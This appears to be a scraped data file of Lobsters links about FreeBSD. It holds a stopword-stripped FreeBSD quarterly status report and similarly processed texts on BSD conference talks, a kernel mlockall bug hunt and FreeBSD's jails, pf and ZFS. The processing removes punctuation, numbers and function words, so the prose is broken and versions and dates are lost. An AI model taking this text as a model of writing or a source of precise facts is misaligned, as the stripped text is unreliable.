shortterm plan finishing interrupt timer porting real hardware platform open task virtualize interrupt timer port real hardware platform create smp support bhyveonarm port contact edward tomasz napierala trasz freebsdorg feature long missing freebsd ability boot temporary rootfs configure kernel able access real rootfs replace temporary root real one linux functionality known pivotroot reroot project aim provide similar functionality different slightly userfriendly way simply put user point view simple running reboot r system performs partial shutdown killing process unmounting rootfs partial bringup mounting new rootfs running init running startup script usual kernel part project committed userland part finishing touch stage expected committed soon merge planned reroot support planned included freebsd project sponsored freebsd foundation contact freebsd graphic team freebsdorg mesa port updated time port received major overhaul make sure port correctly configured dual version support removed one mesa version supported freebsd version libosmesa port provided offscreen version mesa merged mesa framework another big item included mesa port opencl two gpubased opencl implementation langclover supported radeon card langbeignet supported intel card currently ivybridge thanks go johannes dieterich hartmann koop mast making happen mesa uptodate apply update procedure xorg server currently update ready committed shortly kernel side progress made update driver able attach report xorg server start mesa unhappy acceleration work yet want test instruction posted wiki update article see link stage accept patch though able provide support attended two conference xdc toronto eurobsdcon stockholm report posted blog open task see graphic wiki page uptodate information contact jonathan de boyne pollard jdeboynepollardnewsgroups ntlworldcom nosh project suite systemlevel utility initializing running shutting bsd system managing daemon terminal logging supersedes bsd init netbsd rcd system drawing inspiration solaris smf named milestone daemontoolsencore service controlstatus mechanism ucspi ibm aix separated service system management comprises range compatibility mechanism including shim familiar command system automatic import mechanism take existing configuration data etcfstab etcrcconf local etcttys elsewhere applying native service definition creating additional native service portable including linux composable provides migration path world systemd linux require new kernel apis provides clean service environment ordering dependency service parallelized startup shutdown including fsck strictly sizecapped autorotated logging service manager subreaper us kevent eventdriven parallelism past month seen growth import mechanism full import etcfstab etcttys available version july importing pcbsd warden freebsd jail full import gbde geli mountunmount mechanism version october also gained ability automatically regenerate hostconf sysctlconf whenever source file change development past month include fully independent shutdown support longer relying upon externally provided shutdown command another toolset full suite binary package version became possible fullynoshmanaged system freebsd linux using precompiled binary package biggest task remaining one set ago creation enough native service bundle ancillary utility entirely supplant rcd system lot achieved original target list item remaining tricky one course help needed open task still rc script left easy convert etcrcdgptboot etcrcdgrowfs oneshot service etcrcdrouting etcrcdkldxref freebsd etcrcdbluetooth line long iain hibbert wrote simpler bluetooth netbsd perhaps used simpler basis nosh translation add kernel support passing b option pid support bootbare variable loader allow emergency even shell dotfiles loaded rescue mode bootstrap akin linux history b mechanism idea date back version miquel van smoorenburg system init clone dated already known emergency boot add support freebsd fsck outputting machinereadable progress report designated file descriptor nosh provide progress bar multiple fscks running parallel nosh already provides functionality linux fsck provide machinereadable output identify configuration import system need triggered bsdconfig alters configuration file create necessary hook import external configuration change nosh investigate freebsdpcbsd could improved taking advantage available nosh package mechanism contact ed maste emaste freebsdorg contact marcel moolenaar marcel freebsdorg number uefi bug fix committed last quarter improving compatibility different uefi implementation includes improvement efi vt framebuffer driver efifb handle system high resolution display unusual framebuffer stride value particular improves compatibility large number recent apple macbook pro mac open task test freebsd head freebsdstable snapshot variety uefi implementation contact alexander motin mav freebsdorg zfs codebase received significant batch merges sync latest illumos among thing update includes default compression algorithm improved prefetch faster sendreceive reduced ram usage almost improved io aggregation finegrained checksumming sendreceive stream reduced import time pool many datasets reworked simplified predictive prefetcher code committed freebsd head recently merged branch contact eric mccorkle eric metricspacenet uefienabled loaderefi modified support loading booting zfs filesystem described previous report zfsenabled loaderefi treated chainloader using zfsenabled grub quarter several successful test reported simple zfs setup using loaderefi well grub loaderefi successful test reported ufs patched loaderefi well open task test report needed complex zfs setup vdevs mirroring striping raidz pending successful report patch need reviewed committed contact johnmark gurney jmg freebsdorg pci express pcie hotplug used laptop server allow peripheral device added removed system running laptop commonly include hotpluggable pcie either expresscard slot thunderbolt interface expresscard builtin usb support already supported freebsd expresscard pcie device like gigabit ethernet adapter esata card supported present boot removal may cause freebsd crash goal project allow device inserted removed freebsd running work provide basic infrastructure support adding removing device though expected additional work needed update individual driver support hotplug current testing focused getting simple uart device functional basic hot swap currently functional set patch work done project available githubcom project sponsored freebsd foundationopen task get suspendresume functional saving restoring necessary register addressed make sure upon suspend device removed fooled replaced different device machine suspended improve state transition handled possibly using proper state machine contact stanislaw kardach kda semihalfcom contact zyta racia zr semihalfcom project aim add support liquidio family highperformance programmable accelerator ethernet network adapter currently developed kernel driver support pcie card enabling feature cnnic api controllinginteracting smart nic user kernel space including handling multiple concurrent application running device requestreply mechanism synchronous orderedunordered communication remote memory operation device shutdownreset basic nic module utilizing cnnic api caviumprovided nic firmware module provides singlemultiqueue tx hardware tcpudp checksum offloading large receive offload promiscous mode sysctlbased device statistic configuration view custom firmware loading via userbuilt module freebsd firmware mechanism project currently developed house prepared upstream plan making available freebsd project sponsored cavium semihalfopen task upstream code freebsd head contact ed schouten ed freebsdorg cloudabi posixlike runtime environment us capsicum sole access control mechanism cloudabi allows develop software better hardened security vulnerability easier test easier migrate across system august kernel modification needed run cloudabi program integrated freebsd head loading kernel module either run cloudabi program directly shell using cloudabirun tool sysutilscloudabiutils cloudabirun allows inject socket file directory launched program structured way meantime work started developing port collection contains crosscompiled utility library cloudabi intent framework generates native package number operating system making possible develop cloudabi application operating system regardless whether operating system actually support cloudabi interested cloudabi sure go project page github watch recording talk conference wait upcoming edition freebsd journal feature article cloudabi project sponsored nuxi netherlandsopen task cloudabi currently available would make sense port cloudabi additional architecture like support cloudabi integrated freebsd manage upstream support cloudabi operating system possible run binary multiple operating system without recompilation cloudabi port collection currently package although package already building block interesting software always interested expanding contact roger pau monné royger freebsdorg contact julien grall juliengrall citrixcom xen hypervisor using microkernel design providing service allow multiple computer operating system execute computer hardware concurrently xen support freebsd guest introduced version arm support currently worked support running freebsd xen host available head front work quarter focused implementation pvh inside xen consequently activity happened inside hypervisor patch clean pvh implementation posted aim merged next xen release done work continue adding new feature freebsd xen feature parity traditional pv guestshosts apart work ongoing import new netfront linux order support new feature like split event channel multiple queue support arm front quarter work focused getting booting xen guest current activity upstream patch preparing xen driver support includes rework console driver project sponsored citrix system r dopen task generalize event channel code used arm improve backend netback blkback performance work upstream xen improve pvh make stable improve generic bounce buffer code unmapped bios order support alignment requirement blkfront driver contact jim harris jimharris freebsdorg contact conrad meyer cem freebsdorg new driver ioat added tree ioat support intel io acceleration technology device found intel server system device dma offload engine accelerate ioheavy application offloading memory copy main cpu ioat unit acceleration transparent application must adapted take advantage hardware ioat model support advanced copying mode xor mode yet supported ioat driver project sponsored intel corporation emc isilon storage divisionopen task testing especially range device model bdxde looking volunteer support advanced copy mode contact george nevilleneil gnn freebsdorg contact johnmark gurney jmg freebsdorg contact ermal luçi eri freebsdorg ipsec enabled default generic kernel configuration work proceeding speed thing various way latest change addition johnmark gurney ermal luçi george v nevilleneil aes mode hardware software part work also includes benchmark undertaken using conductor netperf project result reported bsdcan vbsdcon come eurobsdcon bsdcon brasil project sponsored netgate freebsd foundationopen task performance improvement tweak ongoing contact konstantin belousov kib freebsdorg contact alan cox alc freebsdorg contact bruce evans bde freebsdorg atomic operation serve two fundamental purpose first building block expressing synchronization algorithm single machineindependent way using highlevel language essense atomics abstract different building block supported various architecture freebsd run making easier develop reason lockless code hiding hardwarelevel detail atomics also provide barrier operation allow software control effect memory outoforder speculative execution modern processor well optimization compiler capability especially important multithreaded software freebsd kernel running system multiple processor communicate shared main memory machine architecture defines memory model specifies possible effect memory outoforder speculative execution precisely specifies extent machine may visibly reorder memory access optimize performance unfortunately almost many model architecture architecture example tso relatively strongly ordered contrast others like powerpc arm relaxed effect atomics define relaxed abstract memory model freebsd machineindependent code efficiently realized architecture freebsd development testing still happens machine combined strongly ordered memory model lead error use atomics specifically barrier word code properly written freebsd abstract memory model strong ordering architecture hide fact architecture impacted code incorrectly us atomics le popular limited availability resulting bug misuse atomics hard diagnose goal project audit upgrade usage lockless facility hopefully fixing bug observed wild freebsd defines set atomics operation like many operating system unlike operating system freebsd model atomics barrier release consistency model also known acquirerelease model model used language standard well new arm architecture despite syntactical difference freebsd atomics share essentially semantics consequently ample tutorial memory model algorithm expressed atomics trivially reused freebsd one facility missing freebsd atomics fence fence bidirectional barrier operation could expressed existing atomicbarrier access added due strong memory model implemented processor atomicloadacq atomicstorerel implemented plain load store instruction compiler barrier additional ordering constraint required simplification atomicstorerel done time ago atomicloadacq change done careful review us kernel userspace ensure hidden dependency stronger implementation left reordering memory access allowed load may reordered older store different location result use store buffer microarchitecural level ensure sequentially consistent behavior storeload barrier need issued done mfence instruction locked readmodifywrite operation latter approach recommended optimization guide intel amd noted careful selection scratch memory location modified locked rmw operation reduce cost barrier avoiding false data dependency corresponding optimization committed atomic man page often cause confusion due erroneous ambiguous statement significant issue addressed change example preemptive fix misuse atomics would become evident weakly ordered machine important lockless algorithm used kernel libc timekeeping functionality implemented kernkerntcc userspace vdsogettimeofday algorithm relied total store order tso behavior fixed kernkernintrc lockless update itneed indicator corrected issue kernsubrsmpc smprendezvouscpus guaranteeing visibility update done cpu caller fixed pthreadonce implementation fixed include missed barrier project sponsored freebsd foundation konstantin belousov work contact dominik ermel der semihalfcom contact wojciech macek wma semihalfcom contact zbigniew bodek zbb semihalfcom cavium thunderx highperformance cpu available configuration core per package thunderx initial reference platform porting effort additional semihalfsponsored work thunderx support brought brand new feature multisocket operation freebsd run twonode thunderx server board total cpu core virtual networking interface card driver vnic driver consists element bgx mdio physical virtual function second driver freebsd utilize sriov capability thunderx able use builtin networking interface gbps moreover previously introduced functionality improved committed head includes pcie driver internal external controller interrupt translation service fix platformspecific change thunderx various fix kernel pci uma etc remaining feature reviewed integrated head soon however generic kernel already support run thunderx project sponsored freebsd foundation arm ltd cavium semihalfopen task upstream remaining feature support vnic driver pcie fix contact andrew turner andrew freebsdorg hikey lowcost development board linaro initiative contains hisilicon kirin eight core ram freebsd ported run hikey minimal set driver report freebsd support microsd slot usb host boot sd card multiuser mode using recent snapshot kernel missing number device driver however usable state people interested testing freebsd hardware project sponsored abt system ltd arm ltdopen task driver sdio onboard wifi fix mmc driver access emmc support usb otg mode support display via hdmi add thermal management contact andrew turner andrew freebsdorg contact ed maste emaste freebsdorg numerous cleanup fix applied kernel includes fix exception handling asynchronous signal ddb pmap ddb updated better handle accessing memory may unmapped pmap code made complete implementing function needed work smp mean freebsd boot core cavium thunderx platform includes adding support arm interrupt controller fixing memory mapping shareable cpu test suite run qemu hardware test case passing around test either broken failing work diagnosing issue remaining test case ongoing project sponsored freebsd foundation abt system ltdopen task port socs contact ruslan bukin br freebsdorg contact arun thomas arunthomas baesystemscom contact ed maste emaste freebsdorg riscv open source instruction set architecture isa designed uc berkeley freely available us without requiring fee license agreement riscv team intends provide freely available bsd licensed cpu design ruslan bukin university cambridge freebsd booting single user shell riscv simulator porting effort started two month ago much work progress requiring significant refactoring clean reach committable state nonetheless exceptional progress short time porting effort also identified number proposed isa improvement port currently us gnu tool chain gcc binutils run spike simulator improved riscv support clangllvm related tool highly desired project sponsored darpa afrl contact baptiste daroussin bapt freebsdorg mandoc suite tool compiling mdoc roff macro language choice bsd manual page mandoc default renderer manpages freebsd head quarter apropos utility switched use mandoc version offer new database format sqlite bringing powerful finegrained way search man page mandoc good man page also provide lot documentation plain roff format heirloom toolchain studied replace groff base heirloom nroff toolchain multiple benefit good unicode support good compatibility groff great deal work done testing heirloom nroff toolchain roff document base system including man page upstream proactive fixing reported bug soelim utility replaced bsdlicensed version good enough work available roff toolchains ease transition version soelim utility originally written solely freebsd part mandoc tool suite coordination ingo schwarze openbsd col utility cleaned updated recognize escapedigit bsdstyle escapecontrolchar sequence input stream checknr utility cleaned extended support modern roff macro including synchronizing code netbsd heirloom doctools version many roff fix made documentation man page discovered testing new toolchain contact freebsd pkg team pkg freebsdorg pkg released many change made since pkg dependency solver greatly improved lot fix threeway merge code pkg add work without version specified dependency line pkg check also check required library improved support partial upgrade improved zsh completion support improved linux support regression test pas linux message contextaware showing given message always installation upgrade conditional previous version removal keywords accept new entry add contextaware message added ability generate graphiz dot format representation solver problem pkg search default showing pkgcomments matched package lot bug fix code cleanup improvement crossinstallation support open task add notion priority list file ensure certain file first replaced blocker packaging base investigate replacing openssl mbedtls contact baptiste daroussin bapt freebsdorg contact allan jude allanjude freebsdorg sesutil originally created universal way blink locate led hotswappable drive enclosure work based original s tool created matthew jacob available shareexamples section source tree built default new utility extends original code number useful feature print map object connected s controller map device name s slot number blink locate andor fault led drive s slot number device name check status entire s controller project sponsored gandi scaleengine inc open task test sesutil hardware diagnose issue locate command sometimes need sent twice activate led add support libxo output type contact john baldwin jhb freebsdorg contact bryan drewery bdrewery freebsdorg interface abispecific backends truss core refactored reducing duplicated code prompted additional followon work add support abis including cloudabi ptrace extended return information currently executing system call restored behavior present previous version truss knowing correct number argument system call forkfollowing support truss reworked use native fork following ptrace rather forking new truss process child traced process support decoding argument added last quarter well open task create new libsysdecode library hold shared code truss kdump decode system call argument add appropriate system call decoding specification system call implement abi linux binary contact john baldwin jhb freebsdorg support following child fork freebsd implemented merged upstream gdb master branch included gdb work continued porting kgdb newer gdb powerpc backends ported available via new kgdb option develgdb port md backends libkvm rewritten support crossdebugging crashdumps kgdb target reworked support crossdebugging kgdb binary able crossdebug architecture vmcores change changeset libkvm yet tree awaiting testing open task test libkvm change platform figure powerpc kgdb target able unwind stack past initial frame add support platform arm mips upstream gdb userland kgdb write new thread target freebsd sent upstream add support debugging powerpc vector register contact torsten zühlsdorff port tocodomainsde contact michael fausten port michaelfaustende gitlab webbased git repository manager many feature used organization including nasa alibaba also longstanding entry wanted port list freebsd wiki last month steady progress finally resulting pr adding new port addition many dependency philip gollucci working already large amount work done along many new updated rubygems rail resurrected large group committers involved process guided u various problem pitfall number dependency nearly hit making progress take time meantime new major version gitlab already released requiring even dependency update work version progress first goal get latest stable version branch port tree project sponsored anymotion graphic gmbh düsseldorf germanyopen task closing pr dependency committing gitlab port updating port latest version branch contact freebsd gnome team freebsdgnome freebsdorg freebsd gnome team maintains gnome mate cinnamon desktop environment graphical user interface freebsd gnome part gnu project mate fork gnome desktop cinnamon desktop environment using gnome technology gnome look feel quarter gnome mate committed port tree followed incremental improvement chapter covering use usegnome within individual port makefiles written committed porter handbook gnome ported however issue need resolved committed port tree open task freebsd gnome website stale work way improve please give feedback suggest improvement chapter porter handbook usegnome functionality continue working investigating issue blocking gnome contact kde freebsd team kde freebsdorg overall updated following port quarter cmake qt qtcreator fixed dependency typo plists spotted ralf nolden development repository done following work updated pyqtbindings added binding contributed guido falsi modified tobias berner updated ralf nolden contributed handful useful new port example branch kept date kde upstream contains port framework plasma desktop application open task work getting stuff branch port major update nearly kde application tester welcome finalize work port probably last release shipping port contact olivier duchateau olivierd freebsdorg nodejs platform built chrome javascript runtime easily building fast scalable network application us eventdriven nonblocking io model make lightweight efficient perfect dataintensive realtime application run across distributed device goal project make easy install module available npm package registry currently repository contains new port particular coffeescript programming language transcompiles javascript nodegyp allows building nodejs addons often written c c request simplified http client also written several helper porting available experimental repository open task bring gruntjs module javascript task runner put effort support nodegyp us framework contact frederic culot portmgrsecretary freebsdorg contact freebsd port management team portmgr freebsdorg end port tree hold port pr count summer period saw le activity port tree previous quarter fewer commits performed active committers unfortunately number problem report closed also decreased significantly fewer problem report fixed several commit bit taken safekeeping following inactivity period month fluffy committer request xmj stefan brix one new developer granted port commit bit jason unovitch junovitch freebsdorg one returning committer babak farrokhi commit bit reinstated management side change made portmgr team qa side expruns performed validate sensitive update cleanup amongst noticeable change update pkg removal several important port update doxygen cmake port default jdk also set infrastructure change included addition new option helper optvars optvarsoff optimplies optprevents macro also removed uniquename latestlink open task would like remind everyone port tree built run volunteer help greatly appreciated important ever since number problem report seem stop increasing use port package please consider jumping helping also true existing porter would great would consider next step share knowledge mentor someone junior port tree internals already task many thanks contact alexey dokuchaev danfe freebsdorg port collection typically receives le attention architecture architecture although several buildruns performed various point past broken port marked time platform powerpc arm improved considerably recently freebsd compiler side tree rebuilt cluster often suspected many port marked broken fact build run correctly past several week port indeed broken least powerpc fixed port incorrectly marked broken leftover old time marked working fewer port still issue requiring work open task port collection could benefit lot frequent sweep targeting system recent work qemubacked emulator muchanticipated crossbuilding port essential piece bring freebsd package par base system support architecturewise contact freebsd xfce team xfce freebsdorg xfce free software desktop environment unix unixlike platform freebsd aim fast lightweight still visually appealing easy use quarter team kept application uptodate wwwmidori also follow unstable release available experimental repository utility backup panel layout trunk branch contains patch support available panel preference open task test new stable release glib kqueuekevent backend enabled disabled revision currently several feature broken especially thunar xfdashboard contact freebsd documentation team freebsddoc freebsdorg contact freebsd translator freebsdtranslators freebsdorg contact warren block wblock freebsdorg freebsd documentation translation process need modernization quite time existing process difficult translator keep translation date help benedict reuschling shaun mccance ryan lortie hiroki sato many others availability new po translation system announced august po translation handle overhead translation process translator keep track commits upstream english version actual work translating quicker easier po editor show much document translated translation already available given string easily reused early testing successful issue involve discovering documenting new process rather fixing bug new translation english document already committed certainly additional change improvement system work continue discover share work translation team project whole work much easier initial hurdle able use po software passed open task continue testing system new u bound bug situation unexpected result improve documentation using new po translation much involves thing rarely happened old system like adding completely new language directory add new translation existing document much le work create update translated document existing new translator working adding updating translation english documentation figure generate share translation memory member language team translator outside team test new po editor like pootle virtaal determine method allow translator commit access translation develop test code translate manual page contact warren block wblock freebsdorg freebsd website remained essentially unchanged appearance many year like legacy system difficult change heavily used therefore subject nontrivial bikeshedding cs shrunk reader font size requested specified hardcoded font object size pixel wide monitor middle third screen used hardware changed existed version site created screen become larger wider increased resolution time time change font size set percentage none smaller width main box changed small adjustment added limited change produced rendered site better respect reader setting much easier read show information although content changed appearance different viewer thought redesigned site gratifying know many people using would also like thank people response overwhelmingly positive hardly bikesheddy open task fix outdated assumption cs alternately rework entire site however much complex ambitious project might seem contact luiz otavio souza loo freebsdorg contact pratik singhal gmailcom allwinner chip arm cpu found increasingly common development board device cubieboardcubieboard banana pi end gsoc project pratik singhal support improved pratik helped implementation testing sd card sata support allwinner chip luiz otavio souza added support dwc network interface capable gigabit speed glen barber kindly added support official freebsd image cubieboard banana pi project sponsored google summer code partly open task driver still missing audio videohdmiframebuffer ir spi pwm fix ifdwc better performance contact michal ratajsky michal freebsdorg contact brook davis brook freebsdorg freebsd includes several program work file system hierarchy description mtree format description also called specification broad range us automatically creating directory structure security auditing program namely mtree bsdtar install makefs implementation mtree format add maintenance overhead also make interoperability difficult implementation support limited subset format goal project create new libmtree library implementing everything mtree format offer wrapping expressive api listed program use also wanted libmtree portable one major user mtree format libarchive library implementing bsdtar currently library functionally complete ready downloaded receive everyone attention also decided bundle mtree program along bundled mtree also modified better portability project included modifying libarchive install makefs use libmtree modified version also available please see wiki page information download location example using libmtree api project sponsored google summer code task test review library code api modification made program fix known problem mentioned wiki page contact tiwei bie btw freebsdorg contact hiren panchasara hiren freebsdorg contact george nevilleneil gnn freebsdorg contact robert watson rwatson freebsdorg aim project design implement infrastructure validate number network stack multiqueue behaviour functioning expected present project implemented mainly consists two part general mechanism collect perring percpu statistic used nic driver extension netstat report statistic suite network stack behavior testing program consists virtual multiqueue ethernet interface vme udp packet generator based vme udp server based socket tcp client based lwip vme tcp server based socket however still need refinement make suitable committing freebsd head project sponsored google summer code contact colin lord clord freebsdorg freebsd bootloader used ficl quite time project intended update version ficl use ficl ficl faster also smaller memory footprint important advantage bootloader part google summer code program worked importing ficl source get bootloader running ficl first half summer consisted setting test environment well arranging source tree properly modifying build file point new location complete source modified build correctly add back freebsdspecific part ficl unfortunately task completed bug ficl project discovered delayed bootloader update finished illumos project faced similar issue ficl received good tip since school started back able put much work fixing bug project sponsored google summer code contact deb goodkin deb freebsdfoundationorg freebsd foundation c nonprofit organization dedicated supporting promoting freebsd project community worldwide funding come individual corporate donation used fund manage development project conference developer summit provide travel grant freebsd developer foundation purchase hardware improve maintain freebsd infrastructure publishes freebsd white paper marketing material promote educate advocate freebsd project foundation also represents freebsd project executing contract license agreement legal arrangement require recognized legal entity highlight help freebsd last quarter anne dickison deb goodkin attended oscon promote freebsd robert watson organized ran cambridge freebsd developer summit bsdcam provided travel grant two freebsd developer attend summit three foundation boardstaff member attended george v nevilleneil attended arm partner meeting met silicon system vendor present unique trait quality freebsd work setting partnership company building deploying arm hardware george robert watson collaborated cambridge developing freebsdbased teaching material undergraduate master level part project funded foundation george planned ran devsummit vbsdcon proud sponsor vbsdcon sept washington dc george v nevilleneil ed maste presented supporting bsd project conference dru lavigne glen barber george v nevilleneil ed maste attended represented foundation vbsdcon freebsd developer summit preceded many people stop table make donation another great opportunity talk work people facetoface cheryl blain john baldwin promoted foundation freebsd snia storage developer conference santa clara california sept foundation also sponsor sponsored andy turner attend linaro connect san francisco sept ed maste project development director attended xorg developer conference xdc toronto ontario sponsored nginx conference sent freebsd community member john baldwin george nevilleneil continued planning silicon valley vendor summit including securing venue benedict reuschling erwin lansing helped plan organize eurobsdcon freebsd developer summit included setting working group securing venue getting tshirts made benedict helped organize dru lavigne participated freebsd hackathon linuxhotel essen germany successful weekend fixing bug collaborating others dru lavigne taught freebsd class berlin germany july sponsor womencourage uppsala sweden sept dru moderator panel open source career path panelist freebsd contributor including dan langille allan jude benedict reuschling deb goodkin also table job fair talked lot student professor benefit working freebsd alternative internship teaching freebsd university class hosting freebsd event school dan taught workshop contribute open source project deb participated workshop started discussion offering similar workshop bsd nonbsd conference workshop would titled contribute freebsd participant would learn contribute documentation project continued publish monthly newsletter keeping community informed including event recap testimonial project update upcoming event received testimonial microsoft nycbus scaleengine also continued approach company provide u testimonial help promote use freebsd anne dickison rebooted face freebsd series working freebsd contributor writing story continued produce freebsd swag literature promote freebsd well advocating freebsd social channel new partnership reached goal freebsd journal subscriber published new open journal article website help promote journal also started offering new subscription bundle buy issue julyaugust issue published justin gibbs began teaching semesterlong freebsd class middle school boulder colorado using beaglebone black bbb run freebsd connected mac pc received lot support internally project get freebsd image work bbb mac pc great collaborative effort community member help future class able support inexpensive platform teaching freebsd work continued creating freebsd curriculum half day workshop hopefully available late spring provided legal support project including granting trademark permission user company requested permission put freebsd logo website marketing literature met commercial user get input would like see supported freebsd also help connect freebsd developer commercial user help facilitate collaboration freebsd foundation employee release engineer glen barber extremely busy quarter working number exciting area freebsd project highlight include code cleanup bug fix several part release build code finishing adding support automatically uploading cloud provider image merged branch code freeze cycle spanned timeframe overall starting code slush freebsd release engineering team released two beta build three rc build cycle final release announced midaugust two week ahead original schedule freebsd cluster administrator team assisted number general update enhancement freebsd infrastructure contact jason edward jason zfsgurucom zfsguru started frontend zfs since grown multifunctional server appliance unique feature project still early development already offer multiple unique feature found project unlike similar project nothing stripped away base operating system meaning zfsguru behaves normal freebsd installation thus versatile webinterface designed unite novice advanced user providing easy use basic functionality well feature appreciated experienced user modular nature project combat danger bloat whilst still allowing extended functionality easily deployed august version zfsguru released highlight new version new build infrastructure allows frequent release system image service semiautomated way new gurudb database allows growing number system image server provides good caching accelerate page installation procedure given major overhaul addition livecd usb image available usb image support legacy mbr bootcode uefi boot many library webinterface overhauled addition many addition web interface many improvement made optional addon service new gnome graphical environment progress made month july august september system image build released supported branch stable current work webinterface started focus improving network support webinterface work new visual theme webinterface started new interface likely included upcoming release new master server prepared likely operational december new website worked launched first january open task new gnome desktop work everyone still issue anyone capable diagnosing issue give gnome livecd try please see linked forum thread information several port fail compile build infrastructure require bug report order get fixed upstream state project due providing overview future development project news home status home
581,Lobsters,freebsd,FreeBSD,EuroBSDCon 2015 OpenBSD Presentations Online,http://undeadly.org/cgi?action=article&sid=20151006134046,eurobsdcon openbsd presentation online,tbert eurobsdcon video slide video slide video paper video slide video slide video slide video slide video video,contributed tbert borkyourconfigswithswedishchef dept year eurobsdcon stockholm sweden quite successful conference approximately attendee fairly strong showing openbsd developer presenting raceless network configuration vadim zhukov video slide portroach openbsd distfile scanner jasper lievisse adriaanse video slide softraid boot stefan sperling video paper cryptography openbsd another overview ted unangst video slide faster secure package openbsd marc espie video slide mandoc scratch standard bsd documentation toolkit year ingo schwarze video slide openbsd matter healthcare industry brandon mercer video slide openbsd suck henning brauer video config rethinking kernel build masao uebayashi video addition ingo schwarze gave half day mandoc tutorial peter hansteen gave half day pf tutorial slide available usual stockholm showed best sunny side conference day good time appears closing session revealed eurobsdcon conference held belgrade beograd serbia
582,Lobsters,freebsd,FreeBSD,vBSDcon 2015 Videos,http://www.verisign.com/en_US/internet-technology-news/verisign-events/vbsdcon/index.xhtml,vbsdcon video,,state network security tool bsd michael shirk michael shirk network security monitoring nsm foundation monitoring network potential intrusion extrusion security tool like snort suricata bro create network log assist investigating potential intrusion always seems interest snort suricata bro mailing list running open source security tool bsd operating system goal talk describe current state open source security tool running various bsd operating system technology assist moving security monitoring back bsd also discussion log management solution available bsd operating system early day bsdcan dc area bsd conference great interest use bsd operating system network security monitoring nsm tool sguil showcased entire process incident response using freebsd since early security company moved away bsd operating system use linux based sensor platform even security onion popular platform nsm run ubuntu although performance gain time change thing like smp linux system grown much annoying running window system due complexity security vulnerability growing concern direction various linux distribution interest moving sensible unix platform network security tool pushing evaluation bsd network sensor high performance network sensor ideally commodity hardware also addition specialized network card goal talk provide overview current network security tool available bsd operating system utilize operating system including special tweak security performance advocate use bsd operating system talk discus experience representing bsd community brocon suricon anecdotal information various network security tool talk also cover managing log data point contention recently tool available open source storing log file
583,Lobsters,freebsd,FreeBSD,Back out all the things! Oh wait.. - FreeBSD bug story,https://blog.crashed.org/dont-backout/,back thing oh wait freebsd bug story,freebsdorg malloc mlockall http http blogcrashedorgcontact,one thing everybody know something break revert recent change bisect work keep going solve problem identified code removed upstream everyone move way work right wait whatever happened figuring actual problem reverting change useful tool diagnostic tool get clue might bought time backing changex make problem go away nt necessarily mean changex actual problem nt actual diagnosis one today freebsdorg cluster every month rebuild everything make sure still make sure find problem started innocently enough usrsbinntpd ntpq p ntpq connection refused sure enough segfault recorded console ktrace exercise showed crashed right mmap call related malloc check source control change log apparent major revision malloc landed last week could easy enough test restoring old c library voila problem solved must malloc revamp right developer seemed sure fast important question nt answered something nt feel right began wonder first people hit three week live crash roughly server crash differently different server crash time one machine time another maybe time others looking ktrace log different machine behavior suspicious looking mlockall right around last one troubling triggered spideysense could mlockall related coincidence seemed difference trace worked trace nt mlockall absolutely effect validity memory mapping hint vm system memory paged albeit strong hint disabled mlockall ntpd gather clue voila restored reliability like reverting malloc change much conclusive assignment blame malloc work still finished still know one coincidence already two perhaps next hour chasing question group finally converged answer root cause bug kernel page fault handler dated way back involvement malloc change arena layout different memory access pattern made race mlockall another thread trigger kernel bug microsecond couple machine nt tracked root cause would accusation made regarding malloc work wasted time effort hunting bug nt hurt feeling ultimately red face lesson learned backing diagnostic tool solution backing could exposed particular bug nt give luxury time likely learn something process figuring computer hard doc malloc mlockall p turn people hit periodically year dismissed networking problem huh odd update fix committed http contact http blogcrashedorgcontact
585,Lobsters,freebsd,FreeBSD,Snowsuit Zine // issue 09 - FreeBSD,http://snowsuit.io/issue09.html,snowsuit zine issue freebsd,would like know would like know would like know would like know,numerous descendant freebsd openbsd osx io probably well known freebsd complete o kernel device driver user utility documentation contrast linux kernel driver leaving rest third party eg red hat ubuntu centos freebsd account open source bsd installed base freebsd unix descends directly work berkeley freebsd value stability performance rarely crash often outperforming peer including many linux variation netflix us freebsd power cdn power roughly internet traffic u sony used freebsd o playstation freebsd erlang together helped whatsapp handle two million concurrent connection per server verisign trust run several internet root nameservers finally freebsd basis apple osx io causing controversy apple hired half freebsd core team back freebsd hold simplicity goal example init system enable ssh add sshdenable yes etcrcconf done init system also understands dependency service launch parallel sequentially necessary get system ready service specifically enabled freebsd team keep system feeling consistent modifying package installs put file location freebsd user would expect find value principle least surprise would like know freebsd care security offer tool like jail great packet filter mandatory access control privilege separation great packet filter jail allow system run inside sandbox ca nt access rest system isolated virtual instance freebsd run kernel linux user currently using container get similar place performance hit using jail host pointofview jail file observed file system someone break jail gain root privilege still locked jail unable escape safely quarantined rest system freebsd packet filter pf come openbsd project openbsd also descendent original bsd make system security one primary focus project gave u openssh libressl carp protocol pf add pfenable yes etcrcconf add firewall rule etcpfconf freebsd also ported openbsd carp protocol carp give freebsd user ability host share ip address virtual host id provide high availability one host go host transparently take carp pf powerful combination keeping network running also secure mandatory access control configure access policy different o resource ie syscalls privilege separation allows system started root grab resource requires root access drop root different user rest process execution freebsd find great solution security problem merging simple concept unix tradition jail access control packet filtering privilege separation easy setup configure go long way reducing blast radius successful attack host would like know freebsd support zfs filesystem zfs one last great effort sun microsystems handle zebibyte mean byte designed focus data integrity make tradeoff steer towards never losing data example endtoend checksum system let zfs notice data corrupt repair zfs obsoletes concept partition treating available storage pool map well raid setup help explain freebsd popular building na appliance zfs also get cheap snapshot deduplication builtin compression use zfs jail new jail created quickly regardless big jail would like know everything already work freebsd freebsd maintains system called port compile different software package purpose port maintain clean system building software freebsd sometimes includes patching original code makefile know fetch source code compile install freebsd maintains binary built using port installed using pkg command compiling tool time consuming tedious event binary package nt available likely package built using port would like know important company already choose freebsd license differs gpl user modify o without forced expose work done difference allows freebsd used foundation work done apple netflix sony enormous social proof among cohort user yet well known point view company using freebsd represents possibility use stack new o gain significant performance improvement immediately
